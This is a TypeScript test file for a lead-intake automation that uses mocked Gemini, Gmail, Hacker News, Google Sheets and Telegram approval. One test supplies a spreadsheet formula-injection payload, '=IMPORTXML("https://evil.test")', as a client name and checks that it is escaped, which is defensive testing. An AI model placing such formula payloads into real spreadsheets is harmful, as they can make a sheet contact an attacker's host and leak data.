import { describe, expect, it, vi } from "vitest";
import {
  classifyGemini,
  planEmailGemini,
  gmailToLead,
  hnSources,
  type Http,
} from "../apps/automation/adapters";
import {
  SheetStore,
  tableHeaders,
  type TablePort,
} from "../apps/automation/sheets";
import { Engine, notification } from "../packages/core/workflow";
import { defaults, inputSchema } from "../packages/core/model";
import { fixtures } from "../fixtures/leads";
const time = "2026-11-12T08:00:00.000Z";
class FakeTables implements TablePort {
  tables = Object.fromEntries(
    Object.entries(tableHeaders).map(([name, header]) => [
      name,
      [[...header]] as unknown[][],
    ]),
  );
  read(name: string) {
    return this.tables[name].map((r) => [...r]);
  }
  writeRow(name: string, row: number, values: unknown[]) {
    this.tables[name][row - 1] = [...values];
  }
  removeRow(name: string, row: number) {
    this.tables[name].splice(row - 1, 1);
  }
}
const options = {
  enabled: true,
  freeTierConfirmed: true,
  dataUseApproved: true,
  apiKey: "test-only-not-a-key",
  model: "test-model",
};
describe("mocked service adapters", () => {
  it('keeps AI draft quotations grounded and refuses invented requirements',()=>{
    const description='We need a React website and an enquiry form connected to Google Sheets. Please keep Telegram approval before email replies.';
    const plan={summary_quote:'We need a React website and an enquiry form connected to Google Sheets.',focus:'website',question_codes:['tools','timing']};
    const response=(value:unknown)=>({json:()=>({candidates:[{content:{parts:[{text:JSON.stringify(value)}]}}]})});
    expect(planEmailGemini(response(plan),description,options)?.summary_quote).toBe(plan.summary_quote);
    expect(planEmailGemini(response({...plan,summary_quote:'Build a complete ecommerce store with payments.'}),description,options)).toBeUndefined();
    const offline=vi.fn();expect(planEmailGemini({json:offline},description,{...options,dataUseApproved:false})).toBeUndefined();expect(offline).not.toHaveBeenCalled();
  });
  it("uses validated Gemini facts and falls back on malformed/429 responses", () => {
    const lead = inputSchema.parse(fixtures()[0]);
    const output = {
      hiring_evidence: "We need",
      skill_evidence: [{ skill: "react", quote: "React website" }],
      timeline_evidence: "flexible",
    };
    const json = vi.fn(() => ({
      candidates: [{ content: { parts: [{ text: JSON.stringify(output) }] } }],
    }));
    const result = classifyGemini({ json }, lead, options);
    expect(result.signals?.skill_evidence).toHaveLength(1);
    expect(json.mock.calls).toHaveLength(1);
    for (const http of [
      {
        json: () => {
          throw new Error("429");
        },
      },
      { json: () => ({ candidates: [] }) },
    ])
      expect(classifyGemini(http, lead, options).warning).toContain(
        "local rules",
      );
    const disabled = vi.fn();
    classifyGemini({ json: disabled }, lead, {
      ...options,
      freeTierConfirmed: false,
    });
    expect(disabled).not.toHaveBeenCalled();
  });
  it("only parses explicitly labeled Gmail messages and preserves unknown permission", () => {
    const raw = {
      id: "message-1",
      labelIds: ["Label_1"],
      internalDate: String(Date.parse(time)),
      payload: {
        mimeType: "multipart/alternative",
        headers: [
          { name: "Subject", value: "Need a React website contractor" },
        ],
        parts: [
          {
            mimeType: "text/plain",
            body: {
              data: Buffer.from(
                "We need a React website and CRM. Flexible timeline. https://www.upwork.com/jobs/~sample",
              ).toString("base64url"),
            },
          },
        ],
      },
    };
    const decode = (s: string) => Buffer.from(s, "base64url").toString();
    expect(gmailToLead(raw, "other", decode)).toBeNull();
    const lead = gmailToLead(raw, "Label_1", decode)!;
    expect(lead.contact_permission_state).toBe("UNKNOWN");
    expect(lead.source_external_id).toBe("message-1");
    expect(lead.source_url).toContain("/jobs/~sample");
  });
  it("uses only official bounded HN API calls, skips deleted jobs and keeps contact unknown", () => {
    const json = vi.fn((url: string) =>
      url.endsWith("jobstories.json")
        ? [1, 2, 3]
        : url.includes("/1.json")
          ? {
              id: 1,
              type: "job",
              title: "Hiring a React website developer for a paid project",
              time: Date.parse(time) / 1000,
            }
          : {
              id: 2,
              type: "job",
              title: "Old removed posting",
              time: Date.parse(time) / 1000,
              deleted: true,
            },
    );
    const leads = hnSources({ json }, 2);
    expect(json).toHaveBeenCalledTimes(3);
    expect(leads).toHaveLength(1);
    expect(leads[0].contact_permission_state).toBe("UNKNOWN");
  });
  it("runs fixture → mocked Sheets → owner alert → authenticated approval → draft, twice without duplicates", () => {
    const tables = new FakeTables();
    const store = new SheetStore(tables);
    const engine = new Engine(store, defaults, { now: () => time });
    let invalid = 0;
    for (const raw of fixtures(time)) {
      try {
        engine.ingest(raw);
      } catch {
        invalid++;
      }
    }
    expect(invalid).toBe(2);
    expect(store.leads()).toHaveLength(12);
    const lead = store.leads().find((l) => l.status === "PENDING_APPROVAL")!;
    const request = engine.prepareApproval(lead, "fixtureNonce1234567");
    const alert = notification(lead, request);
    expect(
      alert.reply_markup.inline_keyboard
        .flat()
        .every((b) => Buffer.byteLength(b.callback_data) <= 64),
    ).toBe(true);
    const telegram: Http = {
      json: vi.fn(() => ({ ok: true, result: { message_id: 777 } })),
    };
    telegram.json("https://api.telegram.org/mock/sendMessage", {
      method: "post",
      body: alert,
    });
    request.state = "SENT";
    request.message_id = "777";
    store.request(request);
    engine.decide({
      userId: defaults.ownerUserId,
      chatId: defaults.ownerChatId,
      chatType: "private",
      messageId: "777",
      data: alert.reply_markup.inline_keyboard[0][0].callback_data,
    });
    for (const raw of fixtures(time)) {
      try {
        engine.ingest(raw);
      } catch {}
    }
    expect(store.leads()).toHaveLength(12);
    expect(store.drafts()).toHaveLength(1);
    expect(store.get(lead.lead_id)?.status).toBe("DRAFT_READY");
    expect(telegram.json).toHaveBeenCalledTimes(1);
    // Reordering rows must not change stable lead identity or overwrite another lead.
    const rows = tables.tables.Leads;
    tables.tables.Leads = [rows[0], ...rows.slice(1).reverse()];
    const original = store.get(lead.lead_id)!;
    store.save({ ...original, owner_notes: "Owner reviewed" });
    expect(store.get(lead.lead_id)?.owner_notes).toBe("Owner reviewed");
    expect(store.leads()).toHaveLength(12);
  });
  it("escapes formula injection in Sheets and deletes associated private records", () => {
    const store = new SheetStore(new FakeTables());
    const engine = new Engine(store, defaults, { now: () => time });
    const l = engine.ingest({
      ...inputSchema.parse(fixtures()[0]),
      client_name_if_public: '=IMPORTXML("https://evil.test")',
    }).lead;
    expect(store.port.read("Leads")[1][8]).toBe(
      '\'=IMPORTXML("https://evil.test")',
    );
    expect(store.get(l.lead_id)?.client_name_if_public).toBe(
      '=IMPORTXML("https://evil.test")',
    );
    store.deleteLead(l.lead_id);
    expect(store.leads()).toHaveLength(0);
    expect(store.activities()).toHaveLength(0);
  });
  it("refuses unexpected sheet schema rather than corrupting columns", () => {
    const tables = new FakeTables();
    tables.tables.Leads[0] = ["wrong"];
    expect(() => new SheetStore(tables).leads()).toThrow("Schema mismatch");
  });
});
